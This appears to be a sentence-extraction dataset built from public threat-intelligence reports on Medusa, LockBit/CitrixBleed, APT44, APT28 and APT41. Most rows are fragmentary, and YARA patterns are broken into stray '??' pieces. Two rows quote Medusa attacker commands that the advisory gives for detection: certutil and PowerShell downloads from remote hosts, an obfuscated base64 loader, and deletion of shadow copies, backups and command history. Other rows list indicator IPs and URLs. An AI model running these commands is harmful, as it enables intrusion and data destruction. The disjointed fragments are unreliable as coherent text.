CAND_02040,R041,11,R041_P0001,R041_S000143," Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R]."
CAND_02041,R041,11,R041_P0001,R041_S000149,Align your security technologies against the technique.
CAND_02042,R041,11,R041_P0001,R041_S000150,3.
CAND_02043,R041,11,R041_P0001,R041_S000153,Analyze your detection and prevention technologies’ performance.
CAND_02044,R041,11,R041_P0001,R041_S000155,Repeat the process for all security technologies to obtain a set of comprehensive performance data.
CAND_02045,R041,12,R041_P0001,R041_S000167,"Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities."
CAND_02046,R041,13,R041_P0001,R041_S000174,TLP:CLEAR FBI | CISA | MS-ISAC Page 13 of 15 | Product ID: AA25-071A TLP:CLEAR Appendix A: Medusa Commands These commands explicitly demonstrate the methods used by Medusa threat actors once they obtain a foothold inside a victim network.
CAND_02047,R041,13,R041_P0001,R041_S000175,Incident responders and threat hunters can use this information to detect malicious activity.
CAND_02048,R041,13,R041_P0001,R041_S000176,System administrators can use this information to design allowlist/denylist policies or other protective mechanisms.
CAND_02049,R041,13,R041_P0001,R041_S000177,"cmd.exe /c certutil -f urlcache https://<domain>/<remotefile>.css <localfile>.dll cmd.exe /c certutil -f urlcache https://<domain>/<remotefile>.msi <localfile>.msi cmd.exe /c driverquery cmd.exe /c echo Computer: %COMPUTERNAME% & ` echo Username: %USERNAME% & ` echo Domain: %USERDOMAIN% & ` echo Logon Server: %LOGONSERVER% & ` echo DNS Domain: %USERDNSDOMAIN% & ` echo User Profile: %USERPROFILE% & echo ` System Root: %SYSTEMROOT% cmd.exe /c ipconfig /all [T1016] cmd.exe /c net share [T1135] cmd.exe /c net use cmd.exe /c netstat -a cmd.exe /c sc query cmd.exe /c schtasks cmd.exe /c systeminfo [T1082] cmd.exe /c ver cmd.exe /c wmic printer get caption,name,deviceid,drivername,portname cmd.exe /c wmic printjob mmc.exe compmgmt.msc /computer:{hostname/ip} mstsc.exe /v:{hostname/ip} mstsc.exe /v:{hostname/ip} /u:{user} /p:{pass} powershell -exec bypass -enc <base64 encrypted command string> powershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New- Object Net.WebClient).$x.Invoke(http://<ip>/<RMM tool>.msi) powershell -nop -w hidden -noni -ep bypass &([scriptblock]::create(( New-Object System.IO.StreamReader( New-Object System.IO.Compression.GzipStream(( New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String( (('<base64 payload string>')-f'<character replacement 0>', '<character replacement 1>','<character replacement 2>')))), [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) powershell Remove-Item (Get-PSReadlineOption).HistorySavePath powershell Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,Description,LastLogonDate,"
CAND_02050,R041,15,R041_P0001,R041_S000179,"TLP:CLEAR FBI | CISA | MS-ISAC Page 15 of 15 | Product ID: AA25-071A TLP:CLEAR vssadmin.exe Delete Shadows /all /quiet vssadmin.exe resize shadowstorage /for=%s /on=%s /maxsize=unbounded del /s /f /q %s*.VHD %s*.bac %s*.bak %s*.wbcat %s*.bkf %sBac kup*.* %sbackup*.* %s*.set %s*.win %s*.dsk netsh advfirewall firewall add rule name=""rdp"" dir=in protocol=tcp localport=3389 action=allow netsh advfirewall firewall set rule group=""windows management instrumentation (wmi)"" new enable=yes reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
CAND_02051,R042,1,R042_P0002,R042_S000007,"Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release."
CAND_02052,R042,2,R042_P0003,R042_S000023,"CISA and the authoring organizations strongly encourage network administrators to apply the mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and applying necessary software updates through the Citrix Knowledge Center."
CAND_02053,R042,2,R042_P0003,R042_S000039,This critical vulnerability exploit impacts the following software versions [1]:
CAND_02054,R042,3,R042_P0003,R042_S000047,Other observed activities include the use of a variety of TTPs commonly associated with ransomware activity.
CAND_02055,R042,4,R042_P0003,R042_S000052,"• Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely."
CAND_02056,R042,4,R042_P0003,R042_S000059,Ties back to dns0.org.
CAND_02057,R042,5,R042_P0003,R042_S000075,81.19.135[.]219 IP High Russian geolocated IP hxxp://81.19.135[.]219/F8PtZ87fE8dJWqe.hta Hxxp://81.19.135[.]219:443/q0X5wzEh6P7.hta 45.129.137[.]233 IP Medium Callouts from known compromised device beginning during the compromised window.
CAND_02058,R042,5,R042_P0003,R042_S000079,Plink can be used to automate SSH actions and for remote SSH tunneling on Windows.
CAND_02059,R042,6,R042_P0003,R042_S000091,Adobelib.dll Persistence Low C2 from adobelib.dll.
CAND_02060,R042,7,R042_P0002,R042_S000097,CISA  FBI | MS-ISAC | ACSC Page 7 of 19 | Product ID: AA23-325A
CAND_02061,R042,9,R042_P0003,R042_S000104,TLP:CLEAR TLP:CLEAR tool screenconnect rmm tool splashtop rmm tool zoho assist rmm ipv4 101.97.36[.]61 zoho assist ipv4 168.100.9[.]137 ssh portforwarding infra ipv4 185.20.209[.]127 zoho assist ipv4 185.230.212[.]83 zoho assist ipv4 206.188.197[.]22 powershell reverse shell seen in powershell logging ipv4 54.84.248[.]205 fixme ip Ipv4 141.98.9[.]137 Remote IP for CitrixBleed domain assist.zoho.eu zoho assist filename c:\perflogs\1.exe connectwise renamed filename c:\perflogs\run.exe screenconnect pushed by psexec filename c:\perflogs\64-bit\m.exe connectwise renamed filename c:\perflogs\64-bit\m0.exe connectwise renamed filename c:\perflogs\za_access_my_departm ent.exe zoho remote assist
CAND_02062,R042,11,R042_P0003,R042_S000109,"Table 6: ATT&CK Techniques for Enterprise: Discovery Technique Title ID Use System Information Discovery T1082 Threat actors will attempt to obtain information about the operating system and hardware, including versions, and patches."
CAND_02063,R042,11,R042_P0003,R042_S000116,• Identify if users are logging in from geolocations uncommon for your organization’s user base.
CAND_02064,R042,12,R042_P0003,R042_S000126,"Below, are CISA developed YARA rules and an open-source rule that may be used to detect malicious activity in the Citrix NetScaler ADC and Gateway software environment."
CAND_02065,R042,13,R042_P0002,R042_S000129,CISA  FBI | MS-ISAC | ACSC Page 13 of 19 | Product ID: AA23-325A
CAND_02066,R042,13,R042_P0003,R042_S000137,This file issues the remote procedure call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine.
CAND_02067,R042,14,R042_P0003,R042_S000143,The file a.exe loads this file into the running LSASS process on the infected machine.
CAND_02068,R042,15,R042_P0003,R042_S000157,??
CAND_02069,R042,15,R042_P0003,R042_S000171,28 ??
CAND_02070,R042,15,R042_P0003,R042_S000176,??
CAND_02071,R042,15,R042_P0003,R042_S000178,??
CAND_02072,R042,15,R042_P0003,R042_S000188,??
CAND_02073,R042,15,R042_P0003,R042_S000191,6F ??
CAND_02074,R042,15,R042_P0003,R042_S000198,??
CAND_02075,R042,15,R042_P0003,R042_S000208,??
CAND_02076,R042,15,R042_P0003,R042_S000215,6F ??
CAND_02077,R042,15,R042_P0003,R042_S000221,??
CAND_02078,R042,15,R042_P0003,R042_S000224,??
CAND_02079,R042,15,R042_P0003,R042_S000233,??
CAND_02080,R042,15,R042_P0003,R042_S000242,??
CAND_02081,R042,15,R042_P0003,R042_S000253,72 ??
CAND_02082,R042,15,R042_P0003,R042_S000265,Quarantine or take offline potentially affected hosts.
CAND_02083,R042,16,R042_P0003,R042_S000271,TLP:CLEAR TLP:CLEAR 4.
CAND_02084,R042,16,R042_P0003,R042_S000273, Note: Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.
CAND_02085,R042,16,R042_P0003,R042_S000278,MITIGATIONS The authoring organizations of this CSA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise associated with Citrix CVE 2023-4966 and LockBit 3.0 ransomware & ransomware affiliates.
CAND_02086,R042,16,R042_P0003,R042_S000287,"Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation."
CAND_02087,R042,17,R042_P0002,R042_S000292,CISA  FBI | MS-ISAC | ACSC Page 17 of 19 | Product ID: AA23-325A
CAND_02088,R042,17,R042_P0003,R042_S000297,o Log RDP login attempts.
CAND_02089,R042,17,R042_P0003,R042_S000298,"• Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis."
CAND_02090,R042,17,R042_P0003,R042_S000300,• Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions.
CAND_02091,R042,17,R042_P0003,R042_S000302,"• Enable enhanced PowerShell logging [CPG 2.T, 2.U]."
CAND_02092,R042,17,R042_P0003,R042_S000303,"o PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use."
CAND_02093,R042,17,R042_P0003,R042_S000311,"• Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies."
CAND_02094,R042,17,R042_P0003,R042_S000317,o Disable password “hints.” o Require administrator credentials to install software.
CAND_02095,R042,18,R042_P0003,R042_S000322,TLP:CLEAR TLP:CLEAR within 24 to 48 hours of vulnerability disclosure.
CAND_02096,R042,18,R042_P0003,R042_S000329,2.
CAND_02097,R042,18,R042_P0003,R042_S000337,6.
CAND_02098,R042,18,R042_P0003,R042_S000339,"CISA and the authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory."
CAND_02099,R042,18,R042_P0003,R042_S000342,• Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.
CAND_02100,R042,18,R042_P0003,R042_S000346,"Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware,"
CAND_02101,R043,6,R043_P0001,R043_S000029,Patterns of activity over time indicate that APT44 is tasked with a range of different strategic priorities and is highly likely seen by the Kremlin as a flexible instrument of power capable of serving both enduring and emerging intelligence requirements.
CAND_02102,R043,7,R043_P0001,R043_S000043,"In one recent case, access to a software developer resulted in the downstream compromise of critical infrastructure networks in Eastern Europe and Central Asia, followed by the deployment of wiper malware to a select victim organization."
CAND_02103,R043,8,R043_P0001,R043_S000058,We assess that APT44 has likely long viewed criminally sourced tools and infrastructure as a latent pool of disposable capabilities that can be operationalized on short notice without immediate attributive links to its past operations.
CAND_02104,R043,9,R043_P0001,R043_S000064,"• Since Russia’s re-invasion of Ukraine in February 2022, APT44 has been responsible for almost all of the disruptive and destructive cyber attacks against Ukrainian CIKRs that Mandiant has responded to."
CAND_02105,R043,9,R043_P0001,R043_S000069,"• APT44 has also periodically engaged in cyber sabotage operations intended to signal bilateral displeasure, retaliate for political grievances, or otherwise signal the weight of the threat posed by Russia’s cyber program."
CAND_02106,R043,9,R043_P0001,R043_S000070,"For example: – In June 2017, APT44 deployed ETERNALPETYA (aka NotPetya), a wiper disguised as ransomware, timed to coincide with Ukraine’s Constitution Day marking its sovereignty and independence from Russia."
CAND_02107,R043,11,R043_P0001,R043_S000100,Mandiant has previously written about APT44’s shift to pure disruptive tools as a strategy to sustain its wartime tempo of operations.
CAND_02108,R043,18,R043_P0001,R043_S000227,"Upon execution, ILLICITORDER drops the second stage payload to disk and executes it alongside a legitimate installer."
CAND_02109,R043,18,R043_P0001,R043_S000231,ITCHYSPARK Utility ITCHYSPARK is a lateral movement tool used to deploy the NEARMISS wiper.
CAND_02110,R043,18,R043_P0001,R043_S000246,NIKOWIPER.MBR Wiper NIKOWIPER.MBR is a disruptive tool written in C that contains an embedded SysInternal's SDelete executable that is used to delete files on disk.
CAND_02111,R043,18,R043_P0001,R043_S000250,PENNYBAG Dropper PENNYBAG is a malicious macro dropper used to decode and write a payload to disk.
CAND_02112,R043,19,R043_P0001,R043_S000315,EMPYRE Framework EMPYRE is a pen-testing framework that is an OSX/Linux targeted tool inspired by Powershell Empire.
CAND_02113,R043,20,R043_P0001,R043_S000335,"PWNKIT Exploit PWNKIT is an implementation of CVE-2021-4034, used for privilege escalation."
CAND_02114,R043,24,R043_P0001,R043_S000394,??
CAND_02115,R043,24,R043_P0001,R043_S000432,??
CAND_02116,R043,25,R043_P0008,R043_S000461,"$str4 = ""main.(*Client).IsDisconnected"" ascii wide"
CAND_02117,R043,25,R043_P0012,R043_S000465,"$str8 = ""main.(*Client).NewSession"" ascii wide"
CAND_02118,R043,25,R043_P0018,R043_S000471,"$str14 = ""main.(*Client).getOneMessageFromServer"" ascii wide"
CAND_02119,R043,25,R043_P0024,R043_S000477,"$str20 = ""main.(*Session).Lock"" ascii wide"
CAND_02120,R043,25,R043_P0041,R043_S000504,83 C1 ??
CAND_02121,R043,26,R043_P0001,R043_S000517,81 f?
CAND_02122,R043,28,R043_P0004,R043_S000538,7?
CAND_02123,R043,28,R043_P0005,R043_S000561,85 ??
CAND_02124,R043,28,R043_P0007,R043_S000591,0F 8?
CAND_02125,R043,28,R043_P0007,R043_S000592,[4] 81 ??
CAND_02126,R043,29,R043_P0005,R043_S000609,32 ??
CAND_02127,R043,29,R043_P0006,R043_S000625,??
CAND_02128,R043,29,R043_P0011,R043_S000650,$b1 = { E8 [4] 5?
CAND_02129,R043,29,R043_P0011,R043_S000654,24 ??
CAND_02130,R043,29,R043_P0012,R043_S000696,7?
CAND_02131,R043,30,R043_P0001,R043_S000782,24 [4] FF FF FF FF 48 C7 ??
CAND_02132,R043,30,R043_P0001,R043_S000793,48 89 ??
CAND_02133,R043,30,R043_P0011,R043_S000817,condition:
CAND_02134,R043,32,R043_P0001,R043_S000857,3 0 APT44: Unearthing Sandworm PARTYTICKET rule M_APT_Disrupt_PARTYTICKET_1 { meta:
CAND_02135,R043,32,R043_P0023,R043_S000895,"uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of them } NEARMISS rule M_APT_Distupt_NEARMISS_1 { meta: author = ""Mandiant"" strings: $code_fat_corruption = { 8B ??"
CAND_02136,R043,32,R043_P0023,R043_S000904,10 [1-32] 0F B?
CAND_02137,R043,32,R043_P0023,R043_S000910,0D [1-64] FF ??
CAND_02138,R043,33,R043_P0001,R043_S000918,"Based on a rule generated by symhunt for symfunc/ cef8160083d485a3676d55b3fc5e1c42."" strings: $c = { 55 8B EC 81 EC AC 08 ??"
CAND_02139,R043,33,R043_P0001,R043_S000924,8D 85 78 FC FF FF C7 45 DC ??
CAND_02140,R043,33,R043_P0001,R043_S000929,??
CAND_02141,R043,33,R043_P0001,R043_S000966,??
CAND_02142,R043,34,R043_P0001,R043_S000987,25176f????????0025166f????????0013??11??6f????????0672????????6f????????178d????????25161f??9d6f????????6f????????000911??17 8d????????25160672????????6f????????a26f????????13??11??6f????????6f????????13??11??39????????0072????????13??0011??6f????????6f??????
CAND_02143,R043,34,R043_P0001,R043_S000988,??13??2b??11??6f????????74????????13??1e8d????????251611??a2251772????????a2251811??6f????????a2251972????????a2251a11??6f????????13 ??12??28????????a2251b72????????a2251c11??6f????????a2251d72????????a228????????13??11??6f????????2d??de??11??75????????13??11??2c??1 1??6f????????00dc0211??7d????????02177d????????dd????????11??6f????????72????????6f????????13??0011??6f????????6f????????13??1613??2b?
CAND_02144,R043,34,R043_P0001,R043_S001006,6f????????0000000011??28????????0000de??260000de??0038????????0672????????6f????????72????????28????????13??11??39????????0028????
CAND_02145,R043,35,R043_P0002,R043_S001024,E8 [4] 8D 75 ??
CAND_02146,R043,35,R043_P0002,R043_S001027,33 F6 FF D7 81 FE [4] 7E ??
CAND_02147,R043,35,R043_P0005,R043_S001041,"$vbs = ""dim"" ascii wide nocase"
CAND_02148,R043,36,R043_P0003,R043_S001061,??
CAND_02149,R043,36,R043_P0003,R043_S001065,89 C3 81 C3 } condition: uint16(0) == 0x5A4D and $decode_routine and $payload_mine }
CAND_02150,R043,37,R043_P0011,R043_S001076,uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and
CAND_02151,R044,2,R044_P0004,R044_S000007,APT28 Targeting of the Georgian Ministry of Defense........................................................................................................................................9
CAND_02152,R044,3,R044_P0001,R044_S000033,"They compile malware samples with Russian language settings during working hours consistent with the time zone of Russia’s major cities, including Moscow and St."
CAND_02153,R044,3,R044_P0001,R044_S000038,Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations.
CAND_02154,R044,4,R044_P0001,R044_S000043,KEY FINDINGS GEORGIA EASTERN EUROPE SECURITY ORGANIZATIONS APT28 likely seeks to collect intelligence about Georgia’s security and political dynamics by targeting officials working for the Ministry of Internal Affairs and the Ministry of Defense.
CAND_02155,R044,4,R044_P0001,R044_S000048,"APT28 targets insider information related to governments, militaries, and security organizations that would likely benefit the Russian government."
CAND_02156,R044,6,R044_P0001,R044_S000072,"However, three themes in APT28’s targeting clearly reflects areas of specific interest to an Eastern European government, most likely the Russian government."
CAND_02157,R044,7,R044_P0001,R044_S000085,"The Georgian government’s posture and ties to the West are a frequent source of Moscow’s frustration, particularly after the 2008 war."
CAND_02158,R044,8,R044_P0001,R044_S000099,"This tactic could allow APT28 to obtain data from the MIA’s network through a less-monitored route, limiting the MIA network security department’s abilities to detect the traffic."
CAND_02159,R044,9,R044_P0001,R044_S000110,APT28 used a lure document that installed a SOURFACE downloader (further discussed in the Malware section) and contained a listing of birthdays for members of a working group between the Georgian MOD and the U.S.
CAND_02160,R044,10,R044_P0001,R044_S000122,"In late 2013, APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a “Chief Coordinator” in Reason Magazine’s “Caucasian Issues Department” - a division that does not appear to exist.6 (Reason Magazine is a US-based magazine) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine."
CAND_02161,R044,10,R044_P0001,R044_S000126,"We all know, that world is often unfair and cruel, but all together we can make it better."
CAND_02162,R044,11,R044_P0001,R044_S000148,“Operation Saffron Rose”.
CAND_02163,R044,11,R044_P0001,R044_S000157,http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew 10“Chechen website promotes terror: Lavrov”.
CAND_02164,R044,11,R044_P0001,R044_S000162,15 May 2013.
CAND_02165,R044,11,R044_P0001,R044_S000164,"http://voiceofrussia.com/news/2013_05_15/Lavrov-urges- Sweden-to-ban-Chechen-website-server/ Table 1: Examples of APT28 domains imitating organizations in the Caucasus APT28 Domain Real Domain kavkazcentr[.]info The Kavkaz Center / The Caucasus Center, an international Islamic news agency with coverage of Islamic issues, particularly Russia and Chechnya (kavkazcenter.com) rnil[.]am Armenian military (mil.am)"
CAND_02166,R044,12,R044_P0001,R044_S000168,"Over the past two decades, as many of these states joined NATO and the EU, Russia has attempted to regain its influence in the region."
CAND_02167,R044,12,R044_P0001,R044_S000169,Many of APT28’s targets parallel this continued focus on Eastern European governments and militaries.
CAND_02168,R044,12,R044_P0001,R044_S000172,"A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post.12 The Polish security company indicated that the sample was “sent to the government,” presumably the Polish government, given the company’s location and visibility."
CAND_02169,R044,14,R044_P0001,R044_S000203,"APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe (OSCE), an intergovernmental organization that has cited widespread fraud in numerous Russian state elections."
CAND_02170,R044,15,R044_P0001,R044_S000209,15 fireeye.com APT 28: A Window into Russia’s Cyber Espionage Operations?
CAND_02171,R044,19,R044_P0001,R044_S000231,Our analysis of some of the group’s more commonly used tools indicates that APT28 has been systematically updating their tools since 2007.
CAND_02172,R044,19,R044_P0001,R044_S000242,Our analysis of some of the group’s more commonly used tools indicates that APT28 has been systematically updating their malware since 2007.
CAND_02173,R044,20,R044_P0001,R044_S000244,"A number of the malware variants that we profile below, especially the CHOPSTICK family, demonstrate formal coding practices indicative of methodical, diligent programmers."
CAND_02174,R044,21,R044_P0001,R044_S000254,These families encode their strings at compile time using a custom stream cipher.
CAND_02175,R044,21,R044_P0001,R044_S000266,Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together.
CAND_02176,R044,22,R044_P0001,R044_S000270,22 fireeye.com APT 28: A Window into Russia’s Cyber Espionage Operations?
CAND_02177,R044,22,R044_P0001,R044_S000282,Table 4: Evolution of SOURFACE downloader over time MD5 Size Compile Date Export Name Notes 272f0fde35dbdfccbca1e33373b3570d 11264 2013-04-16 10:49:25 UTC Init1 17 8b92fe86c5b7a9e34f433a6fbac8bc3a 14848 2013-08-06 07:53:03 UTC Initialize 18 9eebfebe3987fec3c395594dc57a0c4c 12800 2013-08-14 10:48:59 UTC Initialize 19 da2a657dc69d7320f2ffc87013f257ad 12800 2013-08-21 07:52:10 UTC Initialize Same as previous.
CAND_02178,R044,22,R044_P0001,R044_S000283,1259c4fe5efd9bf07fc4c78466f2dd09 12800 2013-10-03 09:21:10 UTC Initialize Same as previous.
CAND_02179,R044,23,R044_P0001,R044_S000305,"In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader."
CAND_02180,R044,24,R044_P0001,R044_S000313,CHOPSTICK variants may move messages and information using at least three methods: 1.
CAND_02181,R044,24,R044_P0001,R044_S000326,A modular development framework suggests the group has had an organized development effort since as early as 2007.
CAND_02182,R044,27,R044_P0001,R044_S000343,"Petersburg Of the 140 malware samples that we have attributed to APT28 so far, over 89% were compiled between 0400 and 1400 UTC time, as depicted in Figure 10."
CAND_02183,R044,27,R044_P0001,R044_S000344,Over 96% were compiled between Monday and Friday.
CAND_02184,R044,27,R044_P0001,R044_S000347,Petersburg.
CAND_02185,R044,28,R044_P0001,R044_S000351,We assess that APT28 is most likely sponsored by the Russian government.
CAND_02186,R044,32,R044_P0001,R044_S000393,32 fireeye.com APT 28: A Window into Russia’s Cyber Espionage Operations?
CAND_02187,R044,33,R044_P0001,R044_S000409,The command is Base64 encoded and immediately follows the “OK” string.
CAND_02188,R044,34,R044_P0001,R044_S000418,"If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would be written to disk and executed."
CAND_02189,R044,35,R044_P0001,R044_S000432,The static key is derived from opcodes in the backdoor.
CAND_02190,R044,35,R044_P0002,R044_S000436,Web Enterprise Security MBAMService Malwarebytes Anti-Malware APPENDIX D: CHOPSTICK
CAND_02191,R044,37,R044_P0001,R044_S000448,tmp to the C2 server using HTTP POST requests.
CAND_02192,R044,37,R044_P0001,R044_S000449,It does not wait for a response from the server to begin uploading.
CAND_02193,R044,37,R044_P0001,R044_S000451,Figure 13 below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp.
CAND_02194,R044,38,R044_P0001,R044_S000462,The message body of the POST request is also Base64 encoded.
CAND_02195,R044,40,R044_P0001,R044_S000475,"To decode the POST content, the first step is to remove characters from the Base64 string (the number of characters to remove may vary between different communication channels)."
CAND_02196,R044,41,R044_P0001,R044_S000488,0x1301 modProcRet Remote command shell access.
CAND_02197,R044,42,R044_P0001,R044_S000498,"In both variants the modules with keystroke log, file system access, and command shell capabilities have the consistent identifiers 0x10, 0x11, and 0x13, respectively, in the first byte."
CAND_02198,R044,45,R044_P0001,R044_S000519,45 fireeye.com APT 28: A Window into Russia’s Cyber Espionage Operations?
CAND_02199,R044,45,R044_P0001,R044_S000520,"FireEye, Inc."
CAND_02200,R044,45,R044_P0001,R044_S000526,SP.APT28.EN-US.102014
CAND_02201,R045,1,R045_P0001,R045_S000001,"Threat Intelligence APT41 Has Arisen From the DUST July 18, 2024 Mandiant Written by: Mike Stokkel, Pierre Gerlings, Renato Fontana, Luis Rocha, Jared Wilson, Stephen Eckels, Jonathan Lepore"
CAND_02202,R045,2,R045_P0001,R045_S000009,"Overview Recently, Mandiant became aware of an APT41 intrusion where the malicious actor deployed a combination of ANTSWORD and BLUEBEAM web shells for persistence."
CAND_02203,R045,2,R045_P0001,R045_S000012,"As the APT41 intrusion progressed, the group escalated its tactics by deploying the DUSTTRAP dropper."
CAND_02204,R045,2,R045_P0001,R045_S000014,"The decrypted payload was designed to establish communication channels with either APT41-controlled infrastructure for command and control or, in some instances, with a compromised Google Workspace account, further blending its malicious activities with legitimate traffic."
CAND_02205,R045,2,R045_P0001,R045_S000015,The affected Google Workspace accounts have been successfully remediated to prevent further unauthorized access.
CAND_02206,R045,2,R045_P0001,R045_S000016,"Furthermore, APT41 leveraged SQLULDR2 to export data from Oracle Databases, and used PINEGROVE to systematically and efficiently exfiltrate large volumes of sensitive data from the compromised networks, transferring to OneDrive to enable exfiltration and subsequent analysis."
CAND_02207,R045,2,R045_P0001,R045_S000017,"Figure 1: Attack path diagram of observed APT41 attack Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 2/27"
CAND_02208,R045,3,R045_P0001,R045_S000018,"Victimology In collaboration with Google's TAG, Mandiant notified multiple additional organizations across various sectors that have been compromised by this campaign."
CAND_02209,R045,3,R045_P0001,R045_S000021,"In contrast, all affected organizations within the media and entertainment sector were located in Asia."
CAND_02210,R045,3,R045_P0001,R045_S000022,"A significant portion of the victimized organizations within the shipping and logistics sector maintained operations across multiple continents, often as subsidiaries or affiliates of larger multinational corporations operating within the same industry."
CAND_02211,R045,3,R045_P0001,R045_S000023,Mandiant has detected reconnaissance activity directed towards similar organizations operating within other countries such as Singapore.
CAND_02212,R045,3,R045_P0001,R045_S000024,"At the time of the publication, neither Mandiant nor Google TAG have any indicators of these organizations being compromised by APT41, but it could potentially indicate an expanded scope of targeting."
CAND_02213,R045,4,R045_P0001,R045_S000026,Figure 2: Sectors impacted by APT41’s DUSTTRAP campaigns in 2024 APT41 APT41 is a prolific cyber threat group that carries out Chinese state-sponsored espionage activity in addition to financially motivated activity that may be outside of state control.
CAND_02214,R045,4,R045_P0001,R045_S000028,APT41 is unique among tracked China-based actors in that it utilizes non-public malware typically reserved for espionage operations in activities that appear to fall outside the scope of state- sponsored missions.
CAND_02215,R045,4,R045_P0001,R045_S000029,"The group's espionage operations have targeted sectors such as healthcare, high-tech, and telecommunications, and other areas of economic interest."
CAND_02216,R045,4,R045_P0001,R045_S000030,"APT41 has frequently used software supply chain compromises, where they inject malicious code into legitimate software updates."
CAND_02217,R045,4,R045_P0001,R045_S000032,The group's consistent targeting of the video game industry for personal gain is believed to have contributed to the development of tactics later used in their espionage operations.
CAND_02218,R045,5,R045_P0001,R045_S000034,"For additional information on APT41, refer to the following links: Does This Look Infected?"
CAND_02219,R045,5,R045_P0001,R045_S000035,A Summary of APT41 Targeting U.S.
CAND_02220,R045,5,R045_P0001,R045_S000037,Different variations of DUSTPAN may also load an external payload off disk from a hard-coded file path encrypted in the Portable Executable (PE) file.
CAND_02221,R045,5,R045_P0001,R045_S000040,"This time, APT41 disguised DUSTPAN as a Windows binary by executing the malicious file as w3wp.exe or conn.exe."
CAND_02222,R045,5,R045_P0001,R045_S000042,The DUSTPAN samples were configured to load BEACON payloads into memory that were encrypted using chacha20.
CAND_02223,R045,5,R045_P0001,R045_S000043,"The BEACON payloads, once executed, communicated using either self-managed infrastructure hosted behind Cloudflare or utilized Cloudflare Workers as their command-and-control (C2) channels."
CAND_02224,R045,5,R045_P0001,R045_S000045,DUSTTRAP DUSTTRAP is a multi-stage plugin framework with multiple components.
CAND_02225,R045,5,R045_P0001,R045_S000047,"Decryption relies on the target machine's HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID , thereby keying the launcher to the victim system."
CAND_02226,R045,5,R045_P0001,R045_S000048,"The Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 5/27"
CAND_02227,R045,6,R045_P0001,R045_S000056,"The malicious plugin code is only present in the .text section of this file long enough to call ZwCreateSection , loading the trojanized malicious plugin code into memory."
CAND_02228,R045,6,R045_P0001,R045_S000059,The malicious code may therefore not be present in the file depending on when it was quarantined.
CAND_02229,R045,6,R045_P0001,R045_S000061,"The following legitimate DLLs are blocklisted from being trojanized: cfgmgr32.dll combase.dll cryptbase.dll cryptsp.dll dhcpcsvc.dll dhcpcsvc6.dll Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 6/27"
CAND_02230,R045,7,R045_P0001,R045_S000062,"dnsapi.dll FWPUCLNT.DLL gdi32.dll gdi32full.dll iertutil.dll imm32.dll IPHLPAPI.DLL kernel.appcore.dll kernel32.dll KernelBase.dll locale.nls msvcp_win.dll msvcrt.dll mswsock.dll NapiNSP.dll nlaapi.dll nsi.dll ntdll.dll ntmarta.dll oleaut32.dll OnDemandConnRouteHelper.dll pnrpnsp.dll powrprof.dll advapi32.dll apphelp.dll bcrypt.dll bcryptprimitives.dll profapi.dll rasadhlp.dll rpcrt4.dll rsaenh.dll sechost.dll SHCore.dll shell32.dll shlwapi.dll sspicli.dll ucrtbase.dll urlmon.dll user32.dll userenv.dll webio.dll win32u.dll windows.storage.dll winhttp.dll wininet.dll Contact sales Get started for free Cloud Blog 10/6/26, 10:29 AM APT41 Has Arisen From the DUST | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust?utm_source=chatgpt.com 7/27"
CAND_02231,R045,8,R045_P0001,R045_S000066,Additional plugins may be registered and executed via this plugin framework.
